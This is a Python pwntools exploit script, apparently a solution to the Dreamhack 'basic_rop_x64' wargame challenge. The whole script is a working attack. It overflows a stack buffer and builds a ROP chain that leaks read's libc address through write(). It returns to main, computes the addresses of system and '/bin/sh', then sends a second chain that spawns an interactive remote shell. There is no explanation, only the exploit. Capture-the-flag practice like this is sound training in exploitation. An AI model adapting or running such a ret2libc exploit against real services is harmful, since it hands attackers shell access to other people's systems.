from pwn import *

context.arch = "amd64"
p = remote('host3.dreamhack.games', 23551)

e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

write_plt = e.plt['write']
read_got = e.got['read']
main = e.symbols['main']
binsh = list(libc.search(b"/bin/sh"))[0]
read_system_offset = libc.symbols['read'] - libc.symbols['system']
read_binsh_offset = libc.symbols['read'] - binsh

r = ROP(e)
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]

# first main call

# write(1, read_got, ...)
payload = b'a'*0x48
payload += p64(ret)
payload += p64(pop_rdi) + p64(0x1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x0)
payload += p64(write_plt)

# return to main (ret2main)
payload += p64(main)

p.send(payload)

p.recvuntil(b'a'*0x40)
read = p.recvn(8)
system = u64(read) - read_system_offset
binsh = u64(read) - read_binsh_offset

# second main call

payload = b'a'*0x48

# system('/bin/sh')

payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)

p.interactive()
